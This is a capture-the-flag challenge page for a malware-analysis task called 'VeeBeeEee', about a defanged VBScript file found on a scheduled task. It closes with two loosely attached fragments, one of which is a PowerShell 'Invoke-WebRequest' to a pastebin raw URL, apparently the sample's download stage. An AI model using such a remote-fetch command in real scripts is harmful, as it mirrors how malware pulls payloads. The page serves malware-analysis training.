Challenge: VeeBeeEee
Category: Malware
Difficulty: easy
Author: @JohnHammond
Description: While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?

NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.

Download the file(s) below.

	   Reqest = Reqest0 + Reqest1 + Reqest2 +  Reqest3 + Reqest4 + Reqest5'
    b. Invoke-WebRequest https://pastebin.com/raw/SiYGwwcz"
